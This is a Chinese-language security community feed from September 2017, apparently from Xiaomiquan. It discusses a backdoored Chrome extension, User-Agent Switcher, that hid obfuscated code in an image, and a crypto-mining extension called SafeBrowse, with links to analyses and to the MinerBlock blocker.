+<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-09-09:
+
+
+__#后门#__
+
+关注下这个：
+
+[大家注意了 Chrome 的插件 User-Agent Switcher 是个木马 - V2EX](https://www.v2ex.com/t/389340)
+
+...
+
+<img src="https://file.xiaomiquan.com/f7/9a/f79af1bde651a9dd2c989af5ff7daef5802563815d9456228954484c65760e60.jpg" width="25px"/> __岳锦文__: 我来补个图😄
+
+<img src="https://images.xiaomiquan.com/FnBvxT4ntVkAItvr8q4aSlxX9ZoW?e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:ok2p2IT69C_RW4i6cOJgXiVy3Hg=" width="50%" height="50%" align="middle"/>
+
+<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/f7/9a/f79af1bde651a9dd2c989af5ff7daef5802563815d9456228954484c65760e60.jpg" width="25px"/> __岳锦文__: 😄
+
+<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 这个后门太经典了：Canvas图片隐写+ES6语法糖+几个偏门技巧+多层混淆+变量加花。逆起来都眼花，不过确实吻合后门性质。
+
+<img src="https://file.xiaomiquan.com/09/17/09173a8ddd903516f16515893f44703fd4de9ec901a54ac5deeccfe9db189fdd.jpg" width="25px"/> __BigBoy__: 之前调试产品的时候，莫名其妙的发现很多http请求，当时也是调试了很久才定位到是浏览器插件的问题，后来把Crx文件抓出来分析，代码都整理好了，有些代码混淆了没认真研究，就没发现恶意代码，原来是藏图片里了，哈哈，学习了
+
+<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/09/17/09173a8ddd903516f16515893f44703fd4de9ec901a54ac5deeccfe9db189fdd.jpg" width="25px"/> __BigBoy__: 看来以后要多注意这些莫名请求了😄
+
+
+...
+
+---
+
+<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-09-10:
+
+
+__#经验#__
+
+手工逆 Chrome 扩展后门的一些思路
+
+基于昨晚发的那个 Chrome 扩展后门事件，刚刚写了篇小文，供大家参考：
+
+
+[手工逆 Chrome 扩展后门的一些思路](http://mp.weixin.qq.com/s/h7m7-luE4nW_utaZhUrKEA)
+
+ 
+
+玩进去的，欢迎交流。
+
+<img src="https://images.xiaomiquan.com/FikpJYlbDmOLoYuCT6f432ejN6Yp?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:o5OqM2gGj4WByaaxNq5FhrTA6Co=" width="50%" height="50%" align="middle"/>
+<img src="https://images.xiaomiquan.com/Fjjd5-5HgUBmutFJUuy4MkZn9axE?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:7ZVNRvAMSnNfcM9VeL0EJjBH7l4=" width="50%" height="50%" align="middle"/>
+
+
+---
+
+<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-09-20:
+
+
+__#后门#__
+
+第一个 Chrome 挖矿扩展被发现
+
+扩展是 SafeBrowse，14 万安装量...
+
+打着“安全”旗号，利用用户电脑资源偷偷挖矿。细节见：
+
+
+[First ever crypto-mining Chrome extension discover...](https://hotforsecurity.bitdefender.com/blog/first-ever-crypto-mining-chrome-extension-discovered-18992.html)
+
+ 
+
+又是 Chrome 扩展的安全问题，Chrome 对扩展的安全审计得更严格了。
+
+<img src="https://images.xiaomiquan.com/FmGrpCoWrNkErotTtUbOGhh8yCrI?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:RN7nkeZfNDTQTTF2jHRpnfus5uU=" width="50%" height="50%" align="middle"/>
+<img src="https://images.xiaomiquan.com/Fq7UDlAIpRlaLrD0GvbewRGxqa3h?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:Mjk-sIGWJ17fnIjDKjYoNLEDi60=" width="50%" height="50%" align="middle"/>
+
+
+...
+
+<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 早上看到一个扩展，当时还不知道为什么会有人去研发这个，现在知道了：
+
+[GitHub - xd4rker/MinerBlock: A web extension to bl...](https://github.com/xd4rker/MinerBlock)
+
+
+
+<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: MinerBlock 源码很简单，可以阻止基于浏览器的挖坑，但是如果挖矿平台是其他的就得自己去添加了
+
+
+...
 
 ---
 
